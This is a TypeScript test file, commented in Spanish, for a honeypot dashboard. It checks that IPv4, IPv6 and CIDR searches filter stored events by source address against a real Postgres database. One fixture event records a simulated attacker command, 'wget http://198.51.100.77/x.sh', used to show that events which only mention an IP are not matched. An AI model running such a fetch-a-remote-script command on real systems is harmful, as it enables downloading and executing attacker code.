/*
 * Una IP en el buscador de Events filtra por el origen, contra Postgres de
 * verdad: la conversión a inet de una columna de texto (con valores que no son
 * direcciones) no se puede probar mockeando la base. Se salta sin DATABASE_URL.
 */
import { readFileSync } from 'node:fs';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

let hayBase = false;
try {
	for (const l of readFileSync('.env', 'utf8').split('\n')) {
		const m = l.match(/^([A-Z_]+)=(.*)$/);
		if (m && !process.env[m[1]]) process.env[m[1]] = m[2].replace(/^"|"$/g, '');
	}
	hayBase = !!process.env.DATABASE_URL;
} catch {
	hayBase = false;
}
vi.mock('$env/dynamic/private', () => ({ env: process.env }));
vi.mock('$app/environment', () => ({ building: false, dev: true }));

const { db, schema: s } = hayBase ? await import('./db') : ({} as never);
const { eventos, eventosPlanos } = hayBase ? await import('./consultas') : ({} as never);
const { eq } = await import('drizzle-orm');

const SENSOR = 'zz-buscaip';
const TRAMPA = 'zz-buscaip-t1';
const ID = (n: number) => `bbbbbbbb-1111-4000-8000-${String(n).padStart(12, '0')}`;

/* Rangos de documentación: ninguna otra prueba ni dato real los usa con este sensor. */
const ORIGENES: (string | null)[] = [
	'198.51.100.77',
	'198.51.100.200',
	'198.51.99.1',
	/* IPv6 tal como podría escribirla un honeypot: sin comprimir y en mayúsculas. */
	'2001:0DB8:00AA:0000:0000:0000:0000:0005',
	/* Algo que no es una dirección no puede romper la búsqueda por prefijo. */
	'no-es-una-ip',
	null,
	/* Otro origen cuyo comando nombra la IP buscada: no viene de ella. */
	'203.0.113.9'
];

function evento(n: number, ip: string | null) {
	const id = ID(n);
	const cuando = new Date(Date.UTC(2026, 9, 3, 0, n));
	return {
		id,
		sensor: SENSOR,
		linea: JSON.stringify({
			id,
			cuando: cuando.toISOString(),
			origen: { ip: ip ?? '' },
			trampa: { id: TRAMPA, modulo: 'cowrie', tipo: 'contenedor' },
			accion: 'comando',
			severidad: 'alta',
			detalle: { input: n === 7 ? 'wget http://198.51.100.77/x.sh' : 'ls' }
		}),
		hash: `${SENSOR}-${n}`,
		cuando,
		trampa: TRAMPA,
		modulo: 'cowrie',
		tipo: 'contenedor',
		accion: 'comando',
		severidad: 'alta' as const,
		ip,
		conexionEstablecida: true
	};
}

async function limpiar() {
	if (!hayBase) return;
	await db.delete(s.eventos).where(eq(s.eventos.sensor, SENSOR));
	await db.delete(s.sensores).where(eq(s.sensores.id, SENSOR));
}

/* Solo los de esta prueba: la base puede traer eventos de otras. */
const mios = async (q: string) =>
	(await eventos({ q, trampa: TRAMPA }))
		.map((e) => e.id)
		.sort()
		.map((id) => Number(id.slice(-4)));

describe.skipIf(!hayBase)('una IP en el buscador de Events', () => {
	beforeAll(async () => {
		await limpiar();
		await db.insert(s.sensores).values({ id: SENSOR, nombre: SENSOR, claveHash: `x-${SENSOR}` });
		await db.insert(s.eventos).values(ORIGENES.map((ip, i) => evento(i + 1, ip)));
	});
	afterAll(async () => {
		if (hayBase && !process.env.CONSERVAR) await limpiar();
	});

	it('una IPv4 entera: los eventos que vienen de ella, no los que la nombran', async () => {
		expect(await mios('198.51.100.77')).toEqual([1]);
		expect(await mios('  198.51.100.77 ')).toEqual([1]);
		expect(await mios('::ffff:198.51.100.77')).toEqual([1]);
	});

	it('media IP sigue siendo texto: casa dentro de la línea', async () => {
		expect(await mios('198.51.100.7/')).toEqual([]);
		expect(await mios('//198.51.100.77')).toEqual([7]);
		expect(await mios('198.51.100.')).toEqual([1, 2, 7]);
	});

	it('un prefijo CIDR, alineado a octeto o no', async () => {
		expect(await mios('198.51.100.0/24')).toEqual([1, 2]);
		expect(await mios('198.51.100.128/25')).toEqual([2]);
		expect(await mios('198.51.98.0/23')).toEqual([3]);
		expect(await mios('198.0.0.0/7')).toEqual([1, 2, 3]);
		expect(await mios('198.51.100.77/32')).toEqual([1]);
	});

	it('IPv6 por su valor, se escriba como se escriba', async () => {
		expect(await mios('2001:db8:aa::5')).toEqual([4]);
		expect(await mios('2001:DB8:AA:0:0:0:0:5')).toEqual([4]);
		expect(await mios('2001:db8:aa::/48')).toEqual([4]);
		expect(await mios('2001:db8:bb::/48')).toEqual([]);
	});

	it('el CSV filtra igual que la pantalla', async () => {
		const filas = await eventosPlanos({ q: '198.51.100.0/24', trampa: TRAMPA });
		expect(filas.map((f: { ip: string | null }) => f.ip).sort()).toEqual([
			'198.51.100.200',
			'198.51.100.77'
		]);
	});
});
